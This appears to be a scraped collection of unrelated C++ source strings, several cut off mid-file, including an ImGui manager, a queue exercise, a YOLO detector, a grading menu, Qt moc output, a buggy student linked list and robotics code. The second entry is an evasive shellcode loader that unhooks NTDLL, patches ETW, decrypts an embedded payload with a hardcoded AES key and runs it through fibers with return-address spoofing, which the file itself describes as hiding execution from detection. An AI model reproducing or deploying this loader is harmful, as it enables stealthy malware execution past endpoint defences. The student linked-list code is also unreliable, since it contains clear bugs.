\u30c7\u30b9\u30af\u30ea\u30d7\u30bf\u30d2\u30fc\u30d7\u3092\u89e3\u653e\n\tsrvHeap_.Reset();\n#endif\n}\n\nvoid ImGuiManager::Begin() {\n#ifdef _DEBUG\n\t// ImGui\u30d5\u30ec\u30fc\u30e0\u958b\u59cb\n\tImGui_ImplDX12_NewFrame();\n\tImGui_ImplWin32_NewFrame();\n\tImGui::NewFrame();\n#endif\n}\n\nvoid ImGuiManager::End() {\n#ifdef _DEBUG\n\t// \u63cf\u753b\u524d\u6e96\u5099\n\tImGui::Render();\n#endif\n}\n\nvoid ImGuiManager::Draw() {\n#ifdef _DEBUG\n\tID3D12GraphicsCommandList* commandList = dxCommon_->GetCommandList();\n\n\t// \u30c7\u30b9\u30af\u30ea\u30d7\u30bf\u30d2\u30fc\u30d7\u306e\u914d\u5217\u3092\u30bb\u30c3\u30c8\u3059\u308b\u30b3\u30de\u30f3\u30c9\n\tID3D12DescriptorHeap* ppHeaps[] = {srvHeap_.Get()};\n\tcommandList->SetDescriptorHeaps(_countof(ppHeaps), ppHeaps);\n\t// \u63cf\u753b\u30b3\u30de\u30f3\u30c9\u3092\u767a\u884c\n\tImGui_ImplDX12_RenderDrawData(ImGui::GetDrawData(), commandList);\n#endif\n}\n",
    "/* Evasive shellcode loader designed to hide its execution from userland/kernel-land detections */\n\n\n\n#include <iostream>\n\n#include \"allocator.h\"\n#include \"resolvers.h\"\n#include \"unhook.h\"\n#include \"retaddrspoof.h\"\n#include \"defs.h\"\n#include \"etw.h\"\n#include \"AES.h\"\n#include \"hook.h\"\n#include \"rsrc.h\"\n#include \"functions.h\"\n\n\n\n\n\n\nPVOID Gdgt = FindROPGadget(); // used all across the project for ret address spoofing\nLPVOID InitialFiber;\n\n\n\nunsigned char* rc4key;\nunsigned long rc4keysize;\nNTSTATUS status;\nSIZE_T lpDataSize;\n\n\n\nPLARGE_PAGE_INFORMATION pLPI;\n\n\nunsigned char AesKey[] = { 0xBD, 0x19, 0x3D, 0x27, 0x69, 0x8C, 0xC6, 0x80, 0x86, 0x53, 0x8F, 0x3A, 0x53, 0x82, 0x16, 0x85, 0x9C, 0x01, 0x7C, 0xF3, 0xF9, 0xCA, 0x39, 0x1C, 0x08, 0x61, 0x6E, 0x05, 0x6F, 0x74, 0x7B, 0x08 };\n\n\nunsigned char AesIv[] = { 0xAD, 0xC7, 0xC0, 0x5B, 0xA8, 0xAB, 0x80, 0x21, 0x95, 0x8E, 0x46, 0xD6, 0x15, 0x6B, 0x8B, 0xA0 };\n\n\n\n/* AES vars */\n\nPBYTE AesCipherText;\n\nBOOL decryption;\n\nPVOID pPlainBuffer = nullptr;\nDWORD PlainBufferSize = 0;\n\nPVOID ptr = nullptr;\nDWORD ResourceSize;\n\n\nLPVOID Creation = nullptr;\nPVOID lpParameter = nullptr;\n\n\n\nint main() {\n\n\n\tFlushNTDLL();\n\tPatchETW();\n\n\tGetFromRc(ResourceSize, ptr);\n\tAesCipherText = (PBYTE)malloc((SIZE_T)ResourceSize);\n\n\tRetSpoofCall((void*)memcpy, 3, Gdgt, AesCipherText, ptr, (SIZE_T)ResourceSize);\n\n\tdecryption = AESDecrypt(\n\t\tAesCipherText,\n\t\tResourceSize,\n\t\tAesKey,\n\t\tAesIv,\n\t\t&pPlainBuffer,\n\t\t&PlainBufferSize\n\t);\n\n\tif (!decryption) {\n\t\tstd::cout << \"[+] Decryption UnSuccessful\" << std::endl;\n\t\treturn -1;\n\t}\n\n\tpLPI = allocate_large_page(PlainBufferSize);\n\n\tplace_data_rand(pLPI, (PBYTE)pPlainBuffer, PlainBufferSize);\n\n\tfree(AesCipherText);\n\n\tdelete[] pPlainBuffer;\n\n\n\tHookFunction(Sleep, FiberSwitcher);\n\n\tInitialFiber = (LPVOID)RetSpoofCall((void*)e_ConvertThreadToFiber, 1, Gdgt, lpParameter); // converted the current thread to fiber (InitialFiber)\n\n\n#ifdef _DEBUG_PRINT\n\tstd::cout << \"[DEBUG] Converted current thread to fiber\\n\";\n#endif\n\n\n\tULONG OldAccessProtection = 0;\n\n\tstatus = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &pLPI->lpPage, &pLPI->uSize, PAGE_EXECUTE_READ, &OldAccessProtection));\n\t\n\tNTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status);\n\n\tCreation = RetSpoofCall((void*)e_CreateFiber, 3, Gdgt, NULL, (LPFIBER_START_ROUTINE)pLPI->lpData, NULL);  // Created a New fiber on the EntryPoint (PayloadFiber)\n\n\n#ifdef _DEBUG_PRINT\n\tstd::cout << \"[DEBUG] Created the payload fiber\\n\";\n#endif\n\n\n\n\twhile (true) { // main infinite loop\n\t\n\n#ifdef _DEBUG_PRINT\n\tstd::cout << \"[DEBUG] Switching to payload fiber\\n\";\n#endif\n\t\t\n\t\n\tRetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, Creation);\n\t\t\n\n\n\t\t// THIS PART IS EXECUTED AFTER THE BEACON CALLS SLEEP (FiberSwitcher)\n\n#ifdef _DEBUG_PRINT\n\tstd::cout << \"[DEBUG] Sleeping...\\n\";\n#endif \n\n\t\tDelayExecution(dwSleepTime);\n\n\t\t// and then back to loop start\n\n\t}\n\t\n\n\treturn 0;\n}",
    "//queue implementation in array\n#include <iostream>\nusing namespace std;\n\nclass Queue \n{\n    public:\n    int capacity;\n    int front;\n    int rear;\n    int* arr;\n\n    // Constructor to initialize the queue\n    Queue(int capacity) \n    {\n        this->capacity = capacity;\n        arr = new int[capacity];\n        front = -1; // Set front to -1 indicating an empty queue\n        rear = -1;  // Set rear to -1 indicating an empty queue\n    }\n\n    // Enqueue: Add an element to the queue\n    void push(int element) \n    {\n        if (rear + 1 < capacity) \n        { // Check if there's space in the queue\n            if (front == -1) \n            { // If queue is empty\n                front = 0;     // Initialize front\n            }\n            rear++;\n            arr[rear] = element;\n        } \n        else \n        {\n            cout<< \"Queue Overflow\" <<endl;\n        }\n    }\n\n    // Dequeue: Remove an element from the queue\n    void pop() \n    {\n        if (front >= 0) \n        {\n            // If there's only one element, reset front and rear\n            if (front == rear) \n            {\n                front = rear = -1; // Reset to indicate queue is empty\n            } \n            else \n            {\n                front++;\n            }\n        } \n        else \n        {\n            cout<< \"Queue Underflow\" <<endl;\n        }\n    }\n\n    // Peek: Get the front element of the queue\n    int peek() \n    {\n        if (front >= 0) \n        {\n            return arr[front];\n        } \n        else \n        {\n            return -1; // Indicate that the queue is empty\n        }\n    }\n\n    // Destructor to free allocated memory\n    ~Queue() \n    {\n        delete[] arr;\n    }\n};\n\nint main() \n{\n    Queue q(5); // Initialize queue with a capacity of 5\n    q.push(10);\n    q.push(20);\n    q.push(30);\n\n    cout<< \"Front element: \" <<q.peek() <<endl; // Should print 10\n\n    q.pop(); // Remove 10\n    cout<< \"Front element after pop: \" <<q.peek() <<endl; // Should print 20\n}\n/*\nOUTPUT: \nFront element: 10\nFront element after pop: 20\n*/\n",
    "#include <opencv2/opencv.hpp>\n#include <opencv2/dnn.hpp>\n#include <iostream>\n#include <fstream>\n#include <vector>\n\nint main() {\n    // Load class names (Adjust this based on your model's classes)\n    std::vector<std::string> classNames;\n    std::ifstream classFile(\"coco.names\"); // Modify to your class names file if necessary\n    std::string line;\n    while (std::getline(classFile, line)) {\n        classNames.push_back(line);\n    }\n\n    // Load YOLOv5 ONNX model\n    cv::dnn::Net net = cv::dnn::readNetFromONNX(\"yolop-640-640.onnx\");\n    net.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\n    net.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);  // Change to DNN_TARGET_OPENCL for GPU\n\n    // Load the image\n    std::string imagePath = \"stopsign1.jpg\"; // Change this to your image path\n    cv::Mat frame = cv::imread(imagePath);\n    if (frame.empty()) {\n        std::cerr << \"Error: Unable to open image\" << std::endl;\n        return -1;\n    }\n\n    // Define parameters for NMS\n    float confidenceThreshold = 0.25; // Adjust as needed\n    float nmsThreshold = 0.45; // Adjust as needed\n\n    // Create a 4D blob from the image\n    cv::Mat blob = cv::dnn::blobFromImage(frame, 1 / 255.0, cv::Size(640, 640), cv::Scalar(0, 0, 0), true, false);\n    net.setInput(blob);\n\n    // Run forward pass to get output from YOLO\n    std::vector<cv::Mat> outs;\n    net.forward(outs);\n\n    // Vectors to store the results\n    std::vector<int> classIds;\n    std::vector<float> confidences;\n    std::vector<cv::Rect> boxes;\n\n    // Process the detections\n    for (const auto& output : outs) {\n        float* data = (float*)output.data;\n        for (int j = 0; j < output.rows; ++j, data += output.cols) {\n            float confidence = data[4];\n            if (confidence > confidenceThreshold) {  // Confidence threshold\n                int classId = -1;\n                float maxClassScore = -1;\n                for (int k = 5; k < output.cols; ++k) {\n                    if (data[k] > maxClassScore) {\n                        maxClassScore = data[k];\n                        classId = k - 5;\n                    }\n                }\n\n                // Assuming lane class ID is 0, adjust as per your model's classes\n                if (classId == 0 && maxClassScore > confidenceThreshold) {\n                    int centerX = static_cast<int>(data[0] * frame.cols);\n                    int centerY = static_cast<int>(data[1] * frame.rows);\n                    int width = static_cast<int>(data[2] * frame.cols);\n                    int height = static_cast<int>(data[3] * frame.rows);\n                    int left = centerX - width / 2;\n                    int top = centerY - height / 2;\n\n                    // Save the box, confidence, and class ID\n                    boxes.push_back(cv::Rect(left, top, width, height));\n                    confidences.push_back(confidence);\n                    classIds.push_back(classId);\n                }\n            }\n        }\n    }\n\n    // Apply Non-Maximum Suppression to remove redundant boxes\n    std::vector<int> indices;\n    cv::dnn::NMSBoxes(boxes, confidences, confidenceThreshold, nmsThreshold, indices);\n\n    // Draw the final boxes after NMS\n    for (size_t i = 0; i < indices.size(); ++i) {\n        int idx = indices[i];\n        cv::Rect box = boxes[idx];\n        cv::rectangle(frame, box, cv::Scalar(0, 255, 0), 3);\n\n        std::string label = classNames[classIds[idx]] + \": \" + cv::format(\"%.2f\", confidences[idx]);\n        cv::putText(frame, label, cv::Point(box.x, box.y - 10), cv::FONT_HERSHEY_SIMPLEX, 0.5, cv::Scalar(255, 255, 255));\n    }\n\n    // Show the output image with detected lanes\n    cv::imshow(\"YOLOv5 Lane Detection\", frame);\n    cv::waitKey(0); // Wait for a key press before closing the window\n\n    cv::destroyAllWindows();\n    return 0;\n}",
    "/*\n   ESTE FOI UM CODIGO PROPOSTO PELO MEU PROFESSOR DE PROGRAMA\u00c7\u00c3O.\n   ONDE TEMOS QUE SOLICITAR AO USUARIO O NOME, DUAS NOTAS, APRESENTAR A SOMA E AO FIM \n   APRESENTAR A SITUA\u00c7\u00c3O DESSE ALUNO. COMO APROVADO OU N\u00c3O. \n   \n   FOI SOLICIDADO O USO DE FUN\u00c7\u00d5ES PARA A MONTAGEM DO CODIGO.\n*/\n\n#include <iostream>\nusing namespace std;\n\n// Declara\u00e7\u00e3o das fun\u00e7\u00f5es ---------------\nbool simOuNao(string texto);\nchar getChar(string texto);\nvoid alerta(string msg);\nstring nomeDoEstudante();\nint primeiraNota(string nomeEstudante);\nint segundaNota(string nomeEstudante);\nint calculoTotalDasNotas(int notaP1, int notaP2, string nomeEstudante,int notaTotal);\nvoid testeDeAprovacao(int notaTotal, string nomeEstudante);\n//---------------------------------------\n\n\nint main()\n{\n    setlocale(LC_ALL,\"\");  // Ativa o uso de acentos\n    // -------------------------------\n\n    int opcao, notaP1, notaP2, notaTotal;\n    string nomeEstudante;\n    bool continuar;\n    \n    notaP1= 0;\n    notaP2= 0;\n    notaTotal= 0;\n    \n    \n    continuar = true; // condi\u00e7\u00e3o para o la\u00e7o iterar\n\n    do\n    {\n        system(\"cls\");\n        cout << \">>> MENU DE OP\u00c7\u00d5ES <<<\\n\\n\";\n        cout << \"1  - INFORMAR NOME DO ESTUDANTE\\n\";\n        cout << \"2  - NOTA DA 1\u00aa AVALIA\u00c7\u00c3O\\n\";\n        cout << \"3  - NOTA DA 2\u00aa AVALIA\u00c7\u00c3O\\n\";\n        cout << \"4  - CALCULAR NOTA TOTAL\\n\";\n        cout << \"5  - SITUA\u00c7\u00c3O AP\u00d3S NOTA TOTAL\\n\";\n        cout << \"0  - FINALIZAR O PROGRAMA\\n\\n\";\n        cout << \"SUA OP\u00c7\u00c3O --> \";\n        cin >> opcao;\n        \n// AREA DOS CASES        \n        switch(opcao)\n        {\n             case 1: nomeEstudante= nomeDoEstudante();\n                          \n                     break;\n                     // ---------------------------------\n             case 2: notaP1= primeiraNota(nomeEstudante);\n                    \n                     break;\n                     // ---------------------------------\n             case 3: notaP2= segundaNota(nomeEstudante);\n                     break;\n                     // ---------------------------------\n             case 4: notaTotal= calculoTotalDasNotas(notaP1, notaP2, nomeEstudante,notaTotal);\n                    \n                     break;\n                     // ---------------------------------\n             case 5: testeDeAprovacao(notaTotal,nomeEstudante);\n                     break;\n                     // ---------------------------------\n             case 0:\n                     if(simOuNao(\"CONFIRMA FINALIZAR O PROGRAMA?\"))\n                     {\n                         continuar = false;\n                     }\n                     break;\n                     // ---------------------------------\n             default: alerta(\"OP\u00c7\u00c3O INV\u00c1LIDA, TENTE NOVAMENTE <Enter>\");\n        }                \n    }while(continuar);\n    system(\"CLS\");\n    cout << \"PROGRAMA FINALIZADO\\n\";\n    // -------------------------------\n    system(\"pause\");\n    return 0;\n}\n\n//AREA DAS FUNCOES-----------------------------------\nbool simOuNao(string texto) // Escolhe SIM ou N\u00c30\n{\n    char  sn;\n    cout << texto;\n    sn = getChar(\"\\nDigite 's' para SIM ou 'n' para N\u00c3O: \");\n    cout << \"\\n\";\n    if(sn=='s' || sn=='S')\n    {\n        return true;\n    }else{\n        return false;\n    }\n}\n\nchar getChar(string texto)  // Recebe um CHAR e retorna essa escolha\n{\n    char caractere;\n    cout << texto;\n    cin >> caractere;\n    return caractere;\n}\n\nvoid alerta(string msg)  // Apresenta uma mensagem \n{\n    cout << \"\\n\" << msg << \"\\n\";\n    system(\"pause>null\");\n}\n\n\n                //CASE 01: SOLICITA O NOME DO ALUNO AO USUARIO \n                \nstring nomeDoEstudante()\n{\n    string nome;\n    \n    cout << \"Digite o nome do aluno: \\n\";\n    cin >> nome;\n    return nome;\n}\n\n                //CASE 02: SOLICITA A 1\u00ba NOTA AO USUARIO \n                \nint primeiraNota(string nomeEstudante)\n{\n    int primeiraNotaP1;\n    cout << \"Digite a nota da P1 do \" << nomeEstudante << \":\\n\";\n    cin >> primeiraNotaP1;\n    return primeiraNotaP1; \n}\n\n                // CASE 03: SOLICITA A 2\u00ba NOTA AO USUARIO \n\nint segundaNota(string nomeEstudante)\n{\n    int segundaNotaP2;\n    cout << \"Digite a nota da P2 do \" << nomeEstudante << \" : \\n \";\n    cin >> segundaNotaP2;\n    return segundaNotaP2;\n   \n}\n\n                // CASE 04: APRESENTA A SOMA DAS NOTAS P1 E P2.\n \nint calculoTotalDasNotas(int notaP1, int notaP2, string nomeEstudante, int notaTotal)\n{\n    int somaDasNotas;\n    notaTotal= notaP1 + notaP2;\n    cout << \"A nota final do \" << nomeEstudante << \" foi: \" << notaTotal << \" pontos.\" \"\\n\"; \n    system(\"pause>>null\"); \n \n    return notaTotal;\n     \n}\n\n                // CASE 05: AQUI ONDE \u00c9 FEITO O TESTE PARA SABER SE  ALUNO ESTA APROVAFO OU N\u00c3O. \n\nvoid testeDeAprovacao(int notaTotal, string nomeEstudante)\n{\n    if(notaTotal>= 60){\n        cout << \"O aluno \"<< nomeEstudante <<\" se encontra Aprovado. Sua nota final foi: \"<< notaTotal << \" pontos \" \"\\n\";\n    }else{\n        cout << \"O aluno \" << nomeEstudante <<\" se encontra reprovado. Sua nota final foi abaixo de 60 p",
    "/****************************************************************************\r\n** Meta object code from reading C++ file 'mainwindow.h'\r\n**\r\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.7.2)\r\n**\r\n** WARNING! All changes made in this file will be lost!\r\n*****************************************************************************/\r\n\r\n#include \"../../../mainwindow.h\"\r\n#include <QtCore/qmetatype.h>\r\n\r\n#include <QtCore/qtmochelpers.h>\r\n\r\n#include <memory>\r\n\r\n\r\n#include <QtCore/qxptype_traits.h>\r\n#if !defined(Q_MOC_OUTPUT_REVISION)\r\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\r\n#elif Q_MOC_OUTPUT_REVISION != 68\r\n#error \"This file was generated using the moc from 6.7.2. It\"\r\n#error \"cannot be used with the include files from this version of Qt.\"\r\n#error \"(The moc has changed too much.)\"\r\n#endif\r\n\r\n#ifndef Q_CONSTINIT\r\n#define Q_CONSTINIT\r\n#endif\r\n\r\nQT_WARNING_PUSH\r\nQT_WARNING_DISABLE_DEPRECATED\r\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\r\nnamespace {\r\n\r\n#ifdef QT_MOC_HAS_STRINGDATA\r\nstruct qt_meta_stringdata_CLASSMainWindowENDCLASS_t {};\r\nconstexpr auto qt_meta_stringdata_CLASSMainWindowENDCLASS = QtMocHelpers::stringData(\r\n    \"MainWindow\",\r\n    \"singal_newMessage\",\r\n    \"\",\r\n    \"slot_newConnection\",\r\n    \"slot_discardSocket\",\r\n    \"slot_displayError\",\r\n    \"QAbstractSocket::SocketError\",\r\n    \"socketError\",\r\n    \"slot_readSocket\",\r\n    \"on_pushButton_sendMessage_clicked\",\r\n    \"on_pushButton_sendAttachment_clicked\",\r\n    \"slot_displayMessage\",\r\n    \"str\",\r\n    \"send_rmsg\",\r\n    \"QTcpSocket*\",\r\n    \"socket\",\r\n    \"fileType\",\r\n    \"result\"\r\n);\r\n#else  // !QT_MOC_HAS_STRINGDATA\r\n#error \"qtmochelpers.h not found or too old.\"\r\n#endif // !QT_MOC_HAS_STRINGDATA\r\n} // unnamed namespace\r\n\r\nQ_CONSTINIT static const uint qt_meta_data_CLASSMainWindowENDCLASS[] = {\r\n\r\n // content:\r\n      12,       // revision\r\n       0,       // classname\r\n       0,    0, // classinfo\r\n      10,   14, // methods\r\n       0,    0, // properties\r\n       0,    0, // enums/sets\r\n       0,    0, // constructors\r\n       0,       // flags\r\n       1,       // signalCount\r\n\r\n // signals: name, argc, parameters, tag, flags, initial metatype offsets\r\n       1,    1,   74,    2, 0x06,    1 /* Public */,\r\n\r\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\r\n       3,    0,   77,    2, 0x08,    3 /* Private */,\r\n       4,    0,   78,    2, 0x08,    4 /* Private */,\r\n       5,    1,   79,    2, 0x08,    5 /* Private */,\r\n       8,    0,   82,    2, 0x08,    7 /* Private */,\r\n       9,    0,   83,    2, 0x08,    8 /* Private */,\r\n      10,    0,   84,    2, 0x08,    9 /* Private */,\r\n      11,    1,   85,    2, 0x08,   10 /* Private */,\r\n      13,    2,   88,    2, 0x08,   12 /* Private */,\r\n      13,    3,   93,    2, 0x08,   15 /* Private */,\r\n\r\n // signals: parameters\r\n    QMetaType::Void, QMetaType::QString,    2,\r\n\r\n // slots: parameters\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void, 0x80000000 | 6,    7,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void, QMetaType::QString,   12,\r\n    QMetaType::Void, 0x80000000 | 14, QMetaType::QString,   15,   16,\r\n    QMetaType::Void, 0x80000000 | 14, QMetaType::QString, QMetaType::QString,   15,   16,   17,\r\n\r\n       0        // eod\r\n};\r\n\r\nQ_CONSTINIT const QMetaObject MainWindow::staticMetaObject = { {\r\n    QMetaObject::SuperData::link<QMainWindow::staticMetaObject>(),\r\n    qt_meta_stringdata_CLASSMainWindowENDCLASS.offsetsAndSizes,\r\n    qt_meta_data_CLASSMainWindowENDCLASS,\r\n    qt_static_metacall,\r\n    nullptr,\r\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSMainWindowENDCLASS_t,\r\n        // Q_OBJECT / Q_GADGET\r\n        QtPrivate::TypeAndForceComplete<MainWindow, std::true_type>,\r\n        // method 'singal_newMessage'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        QtPrivate::TypeAndForceComplete<QString, std::false_type>,\r\n        // method 'slot_newConnection'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        // method 'slot_discardSocket'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        // method 'slot_displayError'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        QtPrivate::TypeAndForceComplete<QAbstractSocket::SocketError, std::false_type>,\r\n        // method 'slot_readSocket'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        // method 'on_pushButton_sendMessage_clicked'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        // method 'on_pushButton_sendAttachment_clicked'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        // method 'slot_displayMessage'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        QtPrivate::TypeAndForceComplete<const QString &, std::false_type>,\r\n        // method 'send_rmsg'\r\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\r\n        QtPrivate::TypeAndForceComp",
    "#include <stdio.h>\n#include <string.h>\nstruct NGAY{\n    int ngay; \n    int thang; \n    int nam;\n};\nstruct SinhVien{\n    char maSV[8];\n    char hoten[50];\n    int Gioitinh;\n    NGAY ngaysinh;\n    char diachi[100];\n    char lop[12];\n    char khoa[7];\n};\nstruct Thongtin{\n    SinhVien data;\n    Thongtin *next;\n};\nstruct Danhsach{\n    Thongtin *first;\n    Thongtin *last;\n};\nvoid NhapSV(SinhVien x){\n    fflush(stdin);\n    gets(x.maSV);\n    fflush(stdin);\n    gets(x.hoten);\n    fflush(stdin);\n    scanf(\"%d%d%d%d\", x.Gioitinh, x.ngaysinh.ngay, x.ngaysinh.thang, x.ngaysinh.nam);\n    gets(x.diachi);\n    fflush(stdin);\n    gets(x.lop);\n    fflush(stdin);\n    gets(x.khoa);\n    fflush(stdin);\n}\nvoid NhapDS(Danhsach *ds, int total)\n{\n    ds->first = ds->last = NULL;\n    int i = 0;\n    while(i < total){\n        Thongtin* p = new Thongtin;\n        NhapSV(p->data);\n        p->next = ds->first;\n        ds->first = p;\n        i++;\n    }\n}\nvoid Delete(Danhsach *ds, int place)\n{\n    Thongtin* p = ds->first;\n    for (int i = 0; i < place - 1; ++i)\n    {\n        p = p->next;\n    }\n    Thongtin* del = p->next;\n    Thongtin* apd = del->next;\n    p->next = apd;\n    delete del;\n}\nbool sosanh(char sv1[], char sv2[])\n{\n    if (sv2 = 0) return false;\n    if(sizeof(sv1)<sizeof(sv2)) return true;\n    else if (sizeof(sv1)>sizeof(sv2)) return false;\n    else\n    {\n        int i = 0;\n        while (i < sizeof(sv1) - 1)\n        {\n            if(sv1[i] < sv2[i]) return true;\n            else if (sv1[i] > sv2[i]) return false;\n        }\n        return true;\n    }\n}\nvoid sort(Danhsach *sv, int total)\n{\n    Thongtin* p = 0;\n    while (sv->first != 0)\n    {\n        Thongtin* i = sv->first;\n        Thongtin** max = &sv->first;\n        while(i != 0)\n        {\n            if (sosanh(i->data.hoten, (*max)->data.hoten)) max = &i->next;\n            i = i->next;\n        }\n        Thongtin* del = *max;\n        *max = del->next;\n        del->next = p;\n        p = del;\n    }\n}\nvoid append(Danhsach* sv, SinhVien &x)\n{\n    Thongtin* p = new Thongtin;\n    p->data = x;\n    p->next = 0;\n    if (sv->first == nullptr || sosanh(x.hoten, sv->first->data.hoten) < 0)\n    {\n        p->next = sv->first;\n        sv->first = p;\n        return;\n    }\n    Thongtin* ptr = sv->first;\n    while (ptr->next != nullptr && sosanh(ptr->next->data.hoten, x.hoten) < 0)\n    {\n        ptr = ptr->next;\n    }\n    p->next = ptr->next;\n    ptr->next = p;\n}\nint main()\n{\n    int total;\n    scanf(\"%d\", &total);\n    Danhsach sv;\n    Danhsach* psv = &sv;\n    NhapDS(psv, total);\n    psv = &sv;\n    sort(&sv, total);\n    SinhVien x;\n    NhapSV(x);\n    append(psv, x);\n}\n",
    "#include \"rovio/FeatureCoordinates.hpp\"\n\nnamespace rovio{\n\n  FeatureCoordinates::FeatureCoordinates(){\n    mpCamera_ = nullptr;\n    trackWarping_ = false;\n    resetCoordinates();\n  }\n\n  FeatureCoordinates::FeatureCoordinates(const cv::Point2f& pixel){\n    mpCamera_ = nullptr;\n    trackWarping_ = false;\n    resetCoordinates();\n    c_ = pixel;\n    valid_c_ = true;\n  }\n\n  FeatureCoordinates::FeatureCoordinates(const LWF::NormalVectorElement& nor){\n    mpCamera_ = nullptr;\n    trackWarping_ = false;\n    resetCoordinates();\n    nor_ = nor;\n    valid_nor_ = true;\n  }\n\n  FeatureCoordinates::FeatureCoordinates(const Camera* mpCamera): mpCamera_(mpCamera){\n    trackWarping_ = false;\n    resetCoordinates();\n  }\n\n  FeatureCoordinates::~FeatureCoordinates(){};\n\n  void FeatureCoordinates::resetCoordinates(){\n    valid_c_ = false;\n    valid_nor_ = false;\n    set_warp_identity();\n    camID_ = -1;\n  }\n\n  bool FeatureCoordinates::com_c() const{\n    if(!valid_c_){\n      assert(mpCamera_ != nullptr);\n      if(valid_nor_ && mpCamera_->bearingToPixel(nor_,c_)){\n        valid_c_ = true;\n      }\n    }\n    return valid_c_;\n  }\n\n  const cv::Point2f& FeatureCoordinates::get_c() const{\n    if(!com_c()){\n      std::cout << \"    \\033[31mERROR: No valid coordinate data [1]!\\033[0m\" << std::endl;\n    }\n    return c_;\n  }\n\n  bool FeatureCoordinates::com_nor() const{\n    if(!valid_nor_){\n      assert(mpCamera_ != nullptr);\n      if(valid_c_ && mpCamera_->pixelToBearing(c_,nor_)){\n        valid_nor_ = true;\n      }\n    }\n    return valid_nor_;\n  }\n\n  const LWF::NormalVectorElement& FeatureCoordinates::get_nor() const{\n    if(!com_nor()){\n      std::cout << \"    \\033[31mERROR: No valid coordinate data [2]!\\033[0m\" << std::endl;\n    }\n    return nor_;\n  }\n\n  Eigen::Matrix<double,2,2> FeatureCoordinates::get_J() const{\n    assert(mpCamera_ != nullptr);\n    if(!mpCamera_->bearingToPixel(get_nor(),c_,matrix2dTemp_)){\n      matrix2dTemp_.setZero();\n      std::cout << \"    \\033[31mERROR: No valid coordinate data [3]!\\033[0m\" << std::endl;\n    }\n    return matrix2dTemp_;\n  }\n\n  void FeatureCoordinates::set_c(const cv::Point2f& c, const bool resetWarp){\n    c_ = c;\n    valid_c_ = true;\n    valid_nor_ = false;\n    if(trackWarping_ && resetWarp){\n      valid_warp_c_ = false;\n      valid_warp_nor_ = false;\n    }\n  }\n\n\n  void FeatureCoordinates::set_nor(const LWF::NormalVectorElement& nor, const bool resetWarp){\n    nor_ = nor;\n    valid_nor_ = true;\n    valid_c_ = false;\n\n    if(trackWarping_ && resetWarp){\n      valid_warp_c_ = false;\n      valid_warp_nor_ = false;\n    }\n  }\n\n  bool FeatureCoordinates::com_warp_c() const{\n    if(!valid_warp_c_){\n      if(valid_warp_nor_ && com_c() && com_nor()){\n        matrix2dTemp_ = get_J();\n        warp_c_ = (matrix2dTemp_*warp_nor_).cast<float>();\n        valid_warp_c_ = true;\n      }\n    }\n    return valid_warp_c_;\n  }\n\n  Eigen::Matrix2f& FeatureCoordinates::get_warp_c() const{\n    if(!com_warp_c()){\n      std::cout << \"    \\033[31mERROR: No valid warping data in get_warp_c!\\033[0m\" << std::endl;\n    }\n    return warp_c_;\n  }\n\n  bool FeatureCoordinates::com_warp_nor() const{\n    if(!valid_warp_nor_){\n      if(valid_warp_c_ && com_c() && com_nor()){\n        matrix2dTemp_ = get_J();\n        fullPivLU2d_.compute(matrix2dTemp_);\n        if(fullPivLU2d_.rank() == 2){\n          warp_nor_ = fullPivLU2d_.inverse()*warp_c_.cast<double>();\n          valid_warp_nor_ = true;\n        }\n      }\n    }\n    return valid_warp_nor_;\n  }\n\n  Eigen::Matrix2d& FeatureCoordinates::get_warp_nor() const{\n    if(!com_warp_nor()){\n      std::cout << \"    \\033[31mERROR: No valid warping data in get_warp_nor!\\033[0m\" << std::endl;\n    }\n    return warp_nor_;\n  }\n\n  FeatureCoordinates FeatureCoordinates::get_patchCorner(const double x, const double y) const{\n    FeatureCoordinates temp; // TODO: avoid temp\n    get_nor().boxPlus(get_warp_nor()*Eigen::Vector2d(x,y),norTemp_);\n    temp.set_nor(norTemp_);\n    temp.mpCamera_ = mpCamera_;\n    temp.camID_ = camID_;\n    return temp;\n  }\n\n  void FeatureCoordinates::set_warp_c(const Eigen::Matrix2f& warp_c){\n    warp_c_ = warp_c;\n    valid_warp_c_ = true;\n    valid_warp_nor_ = false;\n    isWarpIdentity_ = false;\n  }\n\n  void FeatureCoordinates::set_warp_nor(const Eigen::Matrix2d& warp_nor){\n    warp_nor_ = warp_nor;\n    valid_warp_nor_ = true;\n    valid_warp_c_ = false;\n    isWarpIdentity_ = false;\n  }\n\n  void FeatureCoordinates::set_warp_identity(){\n    warp_c_.setIdentity();\n    valid_warp_c_ = true;\n    valid_warp_nor_ = false;\n    isWarpIdentity_ = true;\n  }\n\n  bool FeatureCoordinates::isInFront() const{\n    return valid_c_ || (valid_nor_ && nor_.getVec()[2] > 0);\n  }\n\n  bool FeatureCoordinates::isNearIdentityWarping() const{\n    return isWarpIdentity_ || (com_warp_c() && (get_warp_c()-Eigen::Matrix2f::Identity()).norm() < 1e-6);\n  }\n\n  void FeatureCoordinates::setPixelCov(const Eigen::Matrix2d& cov){\n    pixelCov_ = cov;\n    es_.compute(cov);\n    sigmaAngle_ = std::atan2(es_.eigenvectors()(1,0).rea",
